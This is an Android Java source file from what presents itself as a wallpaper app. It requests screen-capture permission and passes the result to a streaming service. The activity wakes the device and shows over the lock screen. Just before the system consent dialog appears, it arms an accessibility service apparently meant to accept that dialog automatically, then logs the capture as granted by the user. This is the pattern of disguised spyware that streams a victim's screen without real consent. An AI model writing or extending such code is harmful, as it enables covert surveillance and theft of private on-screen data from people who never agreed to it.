package com.example.wallpaperapplication;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

public class MediaProjectionPermissionActivity extends Activity {
    private static final String TAG = "MediaProjectionActivity";
    private static final int REQUEST_CODE_SCREEN_SHARE = 4123;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(
                    android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                    android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        }

        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            try {
                Intent captureIntent;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    android.media.projection.MediaProjectionConfig config =
                            android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay();
                    captureIntent = mpm.createScreenCaptureIntent(config);
                } else {
                    captureIntent = mpm.createScreenCaptureIntent();
                }
                WallpaperAccessibilityService.armAutoConsent();
                startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_SHARE);
                Log.d(TAG, "Launched native MediaProjection screen capture consent dialog for default display");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start MediaProjection consent intent", e);
                WallpaperAccessibilityService.disarmAutoConsent();
                finish();
            }
        } else {
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        WallpaperAccessibilityService.disarmAutoConsent();
        if (requestCode == REQUEST_CODE_SCREEN_SHARE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.i(TAG, "MediaProjection permission granted by user");
                Intent serviceIntent = new Intent(this, StreamingService.class);
                serviceIntent.setAction(Constants.ACTION_MEDIA_PROJECTION_RESULT);
                serviceIntent.putExtra(Constants.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(Constants.EXTRA_RESULT_DATA, data);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(this, serviceIntent);
                } else {
                    startService(serviceIntent);
                }
            } else {
                Log.w(TAG, "MediaProjection permission denied or dismissed");
            }
        }
        finish();
    }
}
